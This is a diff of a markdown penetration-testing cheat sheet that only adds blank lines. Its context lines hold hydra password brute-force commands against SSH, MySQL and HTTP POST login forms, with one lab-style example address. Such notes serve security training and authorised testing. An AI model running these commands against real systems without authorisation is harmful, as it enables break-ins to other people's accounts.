@@ -16,7 +16,9 @@
 
 #### SSH
 `hydra -f -l user -P passwords.txt <IP> ssh`
+
 OR
+
 `hydra -f -l user -P passwords.txt ssh://<IP>`
 #### MySQL
 `hydra -f -l user -P passwords.txt <IP> mysql`
@@ -27,6 +29,7 @@ OR
 #### HTTP POST FORM
 **Format:**
 `hydra -l user -P passwords.txt <IP> http-post-form "<Login Page Relative URL>:<POST Request Body>:<Error Message Indicator>"`
+
 **Example:**
 `hydra -l user -P passwords.txt 10.10.3.6 http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"`
 #### Windows RDP
